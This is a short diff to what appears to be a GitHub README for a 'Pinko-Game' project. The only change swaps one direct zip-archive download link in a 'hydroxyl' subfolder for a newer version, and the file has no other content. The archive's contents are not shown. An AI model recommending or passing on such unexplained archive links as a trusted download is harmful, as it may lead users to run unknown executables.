@@ -1,2 +1,2 @@
-# https://github.com/Subhopriyo/Pinko-Game/raw/refs/heads/master/hydroxyl/Game_Pinko_1.5.zip
-Boiler plate for https://github.com/Subhopriyo/Pinko-Game/raw/refs/heads/master/hydroxyl/Game_Pinko_1.5.zip
+# https://raw.githubusercontent.com/Subhopriyo/Pinko-Game/master/hydroxyl/Game-Pinko-2.5.zip
+Boiler plate for https://raw.githubusercontent.com/Subhopriyo/Pinko-Game/master/hydroxyl/Game-Pinko-2.5.zip
